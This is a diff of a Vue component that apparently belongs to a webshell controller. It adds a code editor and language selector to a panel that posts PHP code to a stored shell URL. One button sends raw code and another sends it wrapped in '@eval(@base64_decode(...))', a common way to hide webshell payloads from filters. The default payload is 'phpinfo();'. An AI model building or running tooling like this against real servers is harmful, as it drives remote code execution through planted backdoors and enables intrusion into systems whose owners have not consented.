@@ -1,26 +1,48 @@
 <template>
-    <div class="content"
-         ref="content">
+    <div id="content">
         <c-header>
+            <div class="pull-right">
+                <select id="mode" v-model="mode">
+                    <option value="html">HTML</option>
+                    <option value="php">PHP</option>
+                    <option value="java">JAVA</option>
+                    <option value="sql">SQL</option>
+                    <option value="nginx">Nginx</option>
+                    <option value="markdown">Markdown</option>
+                    <option value="javascript">JS</option>
+                    <option value="jsx">JSX</option>
+                    <option value="vue">VUE</option>
+                    <option value="css">CSS</option>
+                </select>
+                <c-button style="margin-left: 10px;" @click="send">发送</c-button>
+                <c-button style="margin-left: 10px;" @click="sendBase64">Base64发送</c-button>
+            </div>
         </c-header>
-        <c-button style="float: right; margin:0 20px;" @click="send">发送</c-button>
-        <c-button style="float: right; margin:0 20px;" @click="sendBase64">Base64发送</c-button>
-
-        <textarea name="" id="" cols="30" rows="10" v-model="code"/>
+        <CodeEditor class="editor" ref="editor" :mode="mode" :content="content"></CodeEditor>
         <div class="html" v-html="res"></div>
     </div>
 </template>
 
 <script>
+    import File from '../../template/php/file.js'
     import crypto from '../../utils/crypto'
+    import CodeEditor from '@/components/editor'
+
 
     export default {
         name: 'codeExec',
+        components: {
+            CodeEditor
+        },
         data() {
             return {
-                code: '',
+                theme: 'idea',
+                mode: 'vue',
+                editor: null,
                 shell: null,
-                res: null
+                res: null,
+                content: ` phpinfo();
+                `
             }
         },
         created() {
@@ -28,40 +50,35 @@
         },
         methods: {
             async send() {
-                let res = await this.$request(this.shell.url, {c: this.code}, {}, 'post')
-                //console.log(res)
+                let content = this.$refs.editor.getValue()
+                let res = await this.$request(this.shell.url, {c: encodeURIComponent(content)}, {}, 'post')
                 this.res = res
             },
             async sendBase64() {
-                let base64Str = crypto.base64Encode(this.code)
+                let content = this.$refs.editor.getValue()
+                let base64Str = crypto.base64Encode(content)
+                base64Str = encodeURIComponent(base64Str)
                 console.log(base64Str)
-                // base64Str = encodeURIComponent(base64Str)
                 let res = await this.$request(this.shell.url, {
                     c: `@eval(@base64_decode('${base64Str}'));`
                 }, {}, 'post')
-                //console.log(res)
                 this.res = res
             },
-        }
+        },
     }
 </script>
 
 <style lang="less" scoped>
     @import "../../assets/less/color";
 
-    .content {
+    #content {
         overflow: auto;
         height: 100%;
-        background: @main-bg-color;
+        // background: @main-bg-color;
         font-size: 18px;
 
-        textarea {
-            font-size: 18px;
-            padding: 20px;
-            width: 100%;
-            background: @main-bg-color;
-            height: 30%;
-            color: white;
+        .editor {
+            height: 50%;
         }
 
         .html {
